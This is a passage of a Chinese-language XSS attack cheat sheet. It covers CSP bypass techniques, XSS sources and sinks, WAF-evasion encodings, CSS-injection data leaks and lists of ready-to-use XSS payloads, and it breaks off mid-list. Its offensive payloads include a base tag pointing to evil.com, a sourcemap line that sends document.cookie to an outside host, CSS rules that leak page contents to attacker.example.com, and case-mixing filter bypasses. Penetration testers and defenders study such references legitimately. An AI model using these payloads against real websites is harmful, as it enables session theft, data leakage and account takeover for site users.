预加载</h3>\n<p>浏览器为了增强用户体验，让浏览器更有效率，就有一个预加载的功能，大体是利用浏览器空闲时间去加载指定的内容，然后缓存起来。这个技术又细分为 DNS-prefetch、subresource、prefetch、preconnect、prerender。</p>\n<p>HTML5 页面预加载是用 link 标签的 rel 属性来指定的。如果 csp 头有 unsafe-inline，则用预加载的方式可以向外界发出请求，例如</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">&lt;!-- 预加载某个页面 --></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>link</span> <span class=\"token attr-name\">rel</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span>prefetch<span class=\"token punctuation\">'</span></span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span>http://xxxx<span class=\"token punctuation\">'</span></span><span class=\"token punctuation\">></span></span><span class=\"token comment\">&lt;!-- firefox --></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>link</span> <span class=\"token attr-name\">rel</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span>prerender<span class=\"token punctuation\">'</span></span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span>http://xxxx<span class=\"token punctuation\">'</span></span><span class=\"token punctuation\">></span></span><span class=\"token comment\">&lt;!-- chrome --></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">&lt;!-- 预加载某个图片 --></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>link</span> <span class=\"token attr-name\">rel</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span>prefetch<span class=\"token punctuation\">'</span></span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span>http://xxxx/x.jpg<span class=\"token punctuation\">'</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">&lt;!-- DNS 预解析 --></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>link</span> <span class=\"token attr-name\">rel</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>dns-prefetch<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://xxxx<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">&lt;!-- 特定文件类型预加载 --></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>link</span> <span class=\"token attr-name\">rel</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span>preload<span class=\"token punctuation\">'</span></span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span>//xxxxx/xx.js<span class=\"token punctuation\">'</span></span><span class=\"token punctuation\">></span></span><span class=\"token comment\">&lt;!-- chrome --></span></pre></td></tr></table></figure><p>另外，不是所有的页面都能够被预加载，当资源类型如下时，将阻止预加载操作：</p>\n<ul>\n<li>URL 中包含下载资源</li>\n<li>页面中包含音频、视频</li>\n<li>POST、PUT 和 DELET 操作的 ajax 请求</li>\n<li>HTTP 认证</li>\n<li>HTTPS 页面</li>\n<li>含恶意软件的页面</li>\n<li>弹窗页面</li>\n<li>占用资源很多的页面</li>\n<li>打开了 chrome developer tools 开发工具</li>\n</ul>\n<h3 id=\"mime-sniff\"><a class=\"anchor\" href=\"#mime-sniff\">#</a> MIME Sniff</h3>\n<p>举例来说，csp 禁止跨站读取脚本，但是可以跨站读 img，那么传一个含有脚本的 img，再 <code>&lt;script href='http://xxx.com/xx.jpg'&gt;</code> ，这里 csp 认为是一个 img，绕过了检查，如果网站没有回正确的 mime type，浏览器会进行猜测，就可能加载该 img 作为脚本</p>\n<h3 id=\"302跳转\"><a class=\"anchor\" href=\"#302跳转\">#</a> 302 跳转</h3>\n<p>对于 302 跳转绕过 CSP 而言，实际上有以下几点限制：</p>\n<ul>\n<li>跳板必须在允许的域内。</li>\n<li>要加载的文件的 host 部分必须跟允许的域的 host 部分一致</li>\n</ul>\n<h3 id=\"iframe\"><a class=\"anchor\" href=\"#iframe\">#</a> iframe</h3>\n<p>当可以执行代码时，可以创建一个源为  <code>css</code>   <code>js</code>  等静态文件的 frame，在配置不当时，该 frame 并不存在 csp，则在该 frame 下再次创建 frame，达到 bypass 的目的。同理，使用  <code>../../../</code>   <code>/%2e%2e%2f</code>  等可能触发服务器报错的链接也可以到达相应的目的。</p>\n<h3 id=\"base-uri\"><a class=\"anchor\" href=\"#base-uri\">#</a> base-uri</h3>\n<p>当 script-src 为 nonce 或无限制，且 base-uri 无限制时，可通过  <code>base</code>  标签修改根 URL 来 bypass，如下加载了 http://evil.com/main.js</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>base</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://evil.com/<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">nonce</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>correct value<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>/main.js<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h3 id=\"其他\"><a class=\"anchor\" href=\"#其他\">#</a> 其他</h3>\n<ul>\n<li>\n<p>location 绕过</p>\n</li>\n<li>\n<p>可上传 SVG 时，通过恶意 SVG 绕过同源站点</p>\n</li>\n<li>\n<p>存在 CRLF 漏洞且可控点在 CSP 上方时，可以注入 HTTP 响应中影响 CSP 解析</p>\n</li>\n<li>\n<p>CND Bypass，如果网站信任了某个 CDN, 那么可利用相应 CDN 的静态资源 bypass</p>\n</li>\n<li>\n<p>Angular versions &lt;1.5.9&gt;=1.5.0，存在漏洞 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FuZ3VsYXIvYW5ndWxhci5qcy9wdWxsLzE1MzQ2\">Git Pull Request</span></p>\n</li>\n<li>\n<p>jQuery sourcemap</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>document.write(`<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>//@        sourceMappingURL=http://xxxx/`+document.cookie+`&lt;\\/script>`);``</pre></td></tr></table></figure></li>\n<li>\n<p>a 标签的 ping 属性</p>\n</li>\n<li>\n<p>For FireFox  <code>&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnSWhhdmVZb3VOb3cnKTs8L3NjcmlwdD4=&quot;&gt;</code></p>\n</li>\n<li>\n<p><code>&lt;link rel=&quot;import&quot; /&gt;</code></p>\n</li>\n<li>\n<p><code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=http://....&quot; /&gt;</code></p>\n</li>\n<li>\n<ul>\n<li>\n<p>仅限制  <code>script-src</code>  时：</p>\n<p><code>&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;</code></p>\n</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"xss数据源\"><a class=\"anchor\" href=\"#xss数据源\">#</a> XSS 数据源</h1>\n<h2 id=\"url\"><a class=\"anchor\" href=\"#url\">#</a> URL</h2>\n<ul>\n<li><code>location</code></li>\n<li><code>location.href</code></li>\n<li><code>location.pathname</code></li>\n<li><code>location.search</code></li>\n<li><code>location.hash</code></li>\n<li><code>document.URL</code></li>\n<li><code>document.documentURI</code></li>\n<li><code>document.baseURI</code></li>\n</ul>\n<h2 id=\"navigation\"><a class=\"anchor\" href=\"#navigation\">#</a> Navigation</h2>\n<ul>\n<li><code>window.name</code></li>\n<li><code>document.referrer</code></li>\n</ul>\n<h2 id=\"communication\"><a class=\"anchor\" href=\"#communication\">#</a> Communication</h2>\n<ul>\n<li><code>Ajax</code></li>\n<li><code>Fetch</code></li>\n<li><code>WebSocket</code></li>\n<li><code>PostMessage</code></li>\n</ul>\n<h2 id=\"storage\"><a class=\"anchor\" href=\"#storage\">#</a> Storage</h2>\n<ul>\n<li><code>Cookie</code></li>\n<li><code>LocalStorage</code></li>\n<li><code>SessionStorage</code></li>\n</ul>\n<h1 id=\"sink\"><a class=\"anchor\" href=\"#sink\">#</a> Sink</h1>\n<h2 id=\"执行javascript\"><a class=\"anchor\" href=\"#执行javascript\">#</a> 执行 JavaScript</h2>\n<ul>\n<li><code>eval(payload)</code></li>\n<li><code>setTimeout(payload, 100)</code></li>\n<li><code>setInterval(payload, 100)</code></li>\n<li><code>Function(payload)()</code></li>\n<li><code>&lt;script&gt;payload&lt;/script&gt;</code></li>\n<li><code>&lt;img src=x onerror=payload&gt;</code></li>\n</ul>\n<h2 id=\"加载url\"><a class=\"anchor\" href=\"#加载url\">#</a> 加载 URL</h2>\n<ul>\n<li><code>location=javascript:alert(/xss/)</code></li>\n<li><code>location.href=javascript:alert(/xss/)</code></li>\n<li><code>location.assign(javascript:alert(/xss/))</code></li>\n<li><code>location.replace(javascript:alert(/xss/))</code></li>\n</ul>\n<h2 id=\"执行html\"><a class=\"anchor\" href=\"#执行html\">#</a> 执行 HTML</h2>\n<ul>\n<li><code>xx.innerHTML=payload</code></li>\n<li><code>xx.outerHTML=payload</code></li>\n<li><code>document.write(payload)</code></li>\n<li><code>document.writeln(payload)</code></li>\n</ul>\n<h1 id=\"xss保护\"><a class=\"anchor\" href=\"#xss保护\">#</a> XSS 保护</h1>\n<h2 id=\"html过滤\"><a class=\"anchor\" href=\"#html过滤\">#</a> HTML 过滤</h2>\n<p>使用一些白名单或者黑名单来过滤用户输入的 HTML，以实现过滤的效果。例如 DOMPurify 等工具都是用该方式实现了 XSS 的保护。</p>\n<h2 id=\"x-frame\"><a class=\"anchor\" href=\"#x-frame\">#</a> X-Frame</h2>\n<p>X-Frame-Options 响应头有三个可选的值：</p>\n<ul>\n<li>DENY\n<ul>\n<li>页面不能被嵌入到任何 iframe 或 frame 中</li>\n</ul>\n</li>\n<li>SAMEORIGIN\n<ul>\n<li>页面只能被本站页面嵌入到 iframe 或者 frame 中</li>\n</ul>\n</li>\n<li>ALLOW-FROM\n<ul>\n<li>页面允许 frame 或 frame 加载</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"xss保护头\"><a class=\"anchor\" href=\"#xss保护头\">#</a> XSS 保护头</h2>\n<p>基于 Webkit 内核的浏览器 (比如 Chrome) 在特定版本范围内有一个名为 XSS auditor 的防护机制，如果浏览器检测到了含有恶意代码的输入被呈现在 HTML 文档中，那么这段呈现的恶意代码要么被删除，要么被转义，恶意代码不会被正常的渲染出来。</p>\n<p>而浏览器是否要拦截这段恶意代码取决于浏览器的 XSS 防护设置。</p>\n<p>要设置浏览器的防护机制，则可使用 X-XSS-Protection 字段 该字段有三个可选的值</p>\n<ul>\n<li><code>0</code>  : 表示关闭浏览器的 XSS 防护机制</li>\n<li><code>1</code>  : 删除检测到的恶意代码， 如果响应报文中没有看到 X-XSS-Protection 字段，那么浏览器就认为 X-XSS-Protection 配置为 1，这是浏览器的默认设置</li>\n<li><code>1; mode=block</code>  : 如果检测到恶意代码，在不渲染恶意代码</li>\n</ul>\n<p>FireFox 没有相关的保护机制，如果需要保护，可使用 NoScript 等相关插件。</p>\n<h1 id=\"waf-bypass\"><a class=\"anchor\" href=\"#waf-bypass\">#</a> WAF Bypass</h1>\n<ul>\n<li>\n<p>利用 &lt;&gt; 标记</p>\n</li>\n<li>\n<p>利用 html 属性</p>\n<ul>\n<li>href</li>\n<li>lowsrc</li>\n<li>bgsound</li>\n<li>background</li>\n<li>value</li>\n<li>action</li>\n<li>dynsrc</li>\n</ul>\n</li>\n<li>\n<p>关键字</p>\n<ul>\n<li>利用回车拆分</li>\n<li>字符串拼接\n<ul>\n<li><code>window[&quot;al&quot; + &quot;ert&quot;]</code></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p>利用编码绕过</p>\n<ul>\n<li>base64</li>\n<li>jsfuck</li>\n<li>String.fromCharCode</li>\n<li>HTML</li>\n<li>URL</li>\n<li>hex\n<ul>\n<li><code>window[&quot;\\x61\\x6c\\x65\\x72\\x74&quot;]</code></li>\n</ul>\n</li>\n<li>unicode</li>\n<li>utf7\n<ul>\n<li><code>+ADw-script+AD4-alert('XSS')+ADsAPA-/script+AD4-</code></li>\n</ul>\n</li>\n<li>utf16</li>\n</ul>\n</li>\n<li>\n<p>大小写混淆</p>\n</li>\n<li>\n<p>对标签属性值转码</p>\n</li>\n<li>\n<p>产生事件</p>\n</li>\n<li>\n<p>css 跨站解析</p>\n</li>\n<li>\n<p>长度限制 bypass</p>\n<ul>\n<li><code>eval(name)</code></li>\n<li><code>eval(hash)</code></li>\n<li><code>import</code></li>\n<li><code>$.getScript</code></li>\n<li><code>$.get</code></li>\n</ul>\n</li>\n<li>\n<p><code>.</code></p>\n<ul>\n<li>使用  <code>。</code>  绕过 IP / 域名</li>\n<li><code>document['cookie']</code>  绕过属性取值</li>\n</ul>\n</li>\n<li>\n<p>过滤引号用  <code>`</code>  绕过</p>\n</li>\n</ul>\n<h1 id=\"技巧\"><a class=\"anchor\" href=\"#技巧\">#</a> 技巧</h1>\n<h2 id=\"httponly\"><a class=\"anchor\" href=\"#httponly\">#</a> httponly</h2>\n<ul>\n<li>在 cookie 为 httponly 的情况下，可以通过 xss 直接在源站完成操作，不直接获取 cookie。</li>\n<li>在有登录操作的情况下，部分站点直接发送登录请求可能会带有 cookie</li>\n<li>部分特定版本的浏览器可能会在 httponly 支持 / 处理上存在问题</li>\n<li>低版本浏览器支持 TRACE / TRACK，可获取敏感的 header 字段</li>\n<li>phpinfo 等页面可能会回显信息，这些信息中包含 http 头</li>\n<li>通过 xss 劫持页面钓鱼</li>\n<li>通过 xss 伪造 oauth 等授权请求，远程登录</li>\n</ul>\n<h2 id=\"css注入\"><a class=\"anchor\" href=\"#css注入\">#</a> CSS 注入</h2>\n<h3 id=\"基本介绍\"><a class=\"anchor\" href=\"#基本介绍\">#</a> 基本介绍</h3>\n<p>CSS 注入最早开始于利用 CSS 中的  <code>expression()</code>   <code>url()</code>   <code>regex()</code>  等函数或特性来引入外部的恶意代码，但是随着浏览器的发展，这种方式被逐渐禁用，与此同时，出现了一些新的攻击方式。</p>\n<h3 id=\"css-selectors\"><a class=\"anchor\" href=\"#css-selectors\">#</a> CSS selectors</h3>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\"></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token selector\">#form2 input[value^='a']</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token property\">background-image</span><span class=\"token punctuation\">:</span> <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span>http://localhost/log.php/a<span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token selector\">#form2 input[value^='b']</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token property\">background-image</span><span class=\"token punctuation\">:</span> <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span>http://localhost/log.php/b<span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token selector\">#form2 input[value^='c']</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token property\">background-image</span><span class=\"token punctuation\">:</span> <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span>http://localhost/log.php/c<span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    [...]</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://example.com<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>form2<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>secret<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>secret<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>abc<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>上图是利用 CSS selectors 完成攻击的一个示例</p>\n<h3 id=\"abusing-unicode-range\"><a class=\"anchor\" href=\"#abusing-unicode-range\">#</a> Abusing Unicode Range</h3>\n<p>当可以插入 CSS 的时候，可以使用  <code>font-face</code>  配合  <code>unicode-range</code>  获取目标网页对应字符集。PoC 如下</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\"></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token atrule\"><span class=\"token rule\">@font-face</span></span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> <span class=\"token property\">font-family</span><span class=\"token punctuation\">:</span>poc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre> <span class=\"token property\">src</span><span class=\"token punctuation\">:</span> <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span>http://attacker.example.com/?A<span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* fetched */</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> <span class=\"token property\">unicode-range</span><span class=\"token punctuation\">:</span>U+0041<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token atrule\"><span class=\"token rule\">@font-face</span></span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> <span class=\"token property\">font-family</span><span class=\"token punctuation\">:</span>poc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> <span class=\"token property\">src</span><span class=\"token punctuation\">:</span> <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span>http://attacker.example.com/?B<span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* fetched too */</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> <span class=\"token property\">unicode-range</span><span class=\"token punctuation\">:</span>U+0042<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token atrule\"><span class=\"token rule\">@font-face</span></span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre> <span class=\"token property\">font-family</span><span class=\"token punctuation\">:</span>poc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre> <span class=\"token property\">src</span><span class=\"token punctuation\">:</span> <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span>http://attacker.example.com/?C<span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* not fetched */</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre> <span class=\"token property\">unicode-range</span><span class=\"token punctuation\">:</span>U+0043<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token selector\">#sensitive-information</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre> <span class=\"token property\">font-family</span><span class=\"token punctuation\">:</span>poc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>sensitive-information<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>AB<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>当字符较多时，则可以结合  <code>::first-line</code>  等 CSS 属性缩小范围，以获取更精确的内容</p>\n<h2 id=\"bypass-via-script-gadgets\"><a class=\"anchor\" href=\"#bypass-via-script-gadgets\">#</a> Bypass Via Script Gadgets</h2>\n<h3 id=\"简介-3\"><a class=\"anchor\" href=\"#简介-3\">#</a> 简介</h3>\n<p>一些网站会使用白名单或者一些基于 DOM 的防御方式，对这些方式，有一种被称为  <code>Code Reuse</code>  的攻击方式可以绕过。该方式和二进制攻防中的 Gadget 相似，使用目标中的合法代码来达到绕过防御措施的目的。在论文  <code>Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets</code>  中有该方法的具体描述。</p>\n<p>portswigger 的一篇博文也表达了类似的想法  <code>https://portswigger.net/blog/abusing-javascript-frameworks-to-bypass-xss-mitigations</code> 。</p>\n<p>下面有一个简单的例子，这个例子使用了  <code>DOMPurify</code>  来加固，但是因为引入了  <code>jquery.mobile.js</code>  导致可以被攻击。</p>\n<h3 id=\"例子\"><a class=\"anchor\" href=\"#例子\">#</a> 例子</h3>\n<pre><code class=\"language-php+HTML\">// index.php\n&lt;?php\n\n$msg = $_GET['message'];\n$msg = str_replace(&quot;\\n&quot;, &quot;&quot;, $msg);\n$msg = base64_encode($msg);\n\n?&gt;\n\n&lt;!DOCTYPE html&gt;\n&lt;html lang=&quot;en&quot;&gt;\n&lt;head&gt;\n    &lt;meta charset=&quot;UTF-8&quot;&gt;\n    &lt;title&gt;Preview&lt;/title&gt;\n    &lt;script type=&quot;text/javascript&quot; src=&quot;purify.js&quot;&gt;&lt;/script&gt;\n    &lt;script type=&quot;text/javascript&quot; src=&quot;jquery.js&quot;&gt;&lt;/script&gt;\n    &lt;script type=&quot;text/javascript&quot; src=&quot;jquery.mobile.js&quot;&gt;&lt;/script&gt;\n&lt;/head&gt;\n&lt;body&gt;\n\n    &lt;script type=&quot;text/javascript&quot;&gt;\n    var d= atob('&lt;?php echo $msg; ?&gt;');\n    var cleanvar = DOMPurify.sanitize(d);\n    document.write(cleanvar);\n    &lt;/script&gt;\n\n&lt;/body&gt;\n&lt;/html&gt;\n// payload\n&lt;div data-role=popup id='--&gt;\n&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;'&gt;\n&lt;/div&gt;\n</code></pre>\n<h2 id=\"rporelative-path-overwrite\"><a class=\"anchor\" href=\"#rporelative-path-overwrite\">#</a> RPO(Relative Path Overwrite)</h2>\n<p>RPO (Relative Path Overwrite) 攻击又称为相对路径覆盖攻击，依赖于浏览器和网络服务器的反应，利用服务器的 Web 缓存技术和配置差异。</p>\n<h1 id=\"payload\"><a class=\"anchor\" href=\"#payload\">#</a> Payload</h1>\n<h2 id=\"常用\"><a class=\"anchor\" href=\"#常用\">#</a> 常用</h2>\n<ul>\n<li><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></li>\n<li><code>&lt;svg onload=alert(document.domain)&gt;</code></li>\n<li><code>&lt;img src=document.domain onerror=alert(document.domain)&gt;</code></li>\n<li><code>&lt;M onmouseover=alert(document.domain)&gt;M</code></li>\n<li><code>&lt;marquee onscroll=alert(document.domain)&gt;</code></li>\n<li><code>&lt;a href=javascript:alert(document.domain)&gt;M&lt;/a&gt;</code></li>\n<li><code>&lt;body onload=alert(document.domain)&gt;</code></li>\n<li><code>&lt;details open ontoggle=alert(document.domain)&gt;</code></li>\n<li><code>&lt;embed src=javascript:alert(document.domain)&gt;</code></li>\n</ul>\n<h2 id=\"大小写绕过\"><a class=\"anchor\" href=\"#大小写绕过\">#</a> 大小写绕过</h2>\n<ul>\n<li><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>\n<li><code>&lt;sCrIpT&gt;alert(1)&lt;/sCrIpT&gt;</code></li>\n<li><code>&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</code></li>\n<li><code>&lt;sCrIpT&gt;alert(1)&lt;/ScRiPt&gt;</code></li>\n<li><code>&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;</code></li>\n<li><code>&lt;img src=1 onerror=alert(1)&gt;</code></li>\n<li><code>&lt;iMg src=1 oNeRrOr=alert(1)&gt;</code></li>\n<li><code>&lt;ImG src=1 OnErRoR=alert(1)&gt;</code></li>\n<li><code>&lt;img src=1 onerror=&quot;alert(&quot;M&quot;)&quot;&gt;</code></li>\n<li><code>&lt;marquee onscroll=alert(1)&gt;</code></li>\n<li><code>&lt;mArQuEe OnScRoLl=alert(1)&gt;</code></li>\n<li><code>&lt;MaRqUeE oNsCrOlL=alert(1)&gt;</code></li>\n</ul>\n<h2 id=\"各种alert\"><a class=\"anchor\" href=\"#各种alert\">#</a> 各种 alert</h2>\n<ul>\n<li><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;confirm(1)&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;prompt(1)&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;alert('1')&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;alert(&quot;1&quot;)&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;alert</code> 1 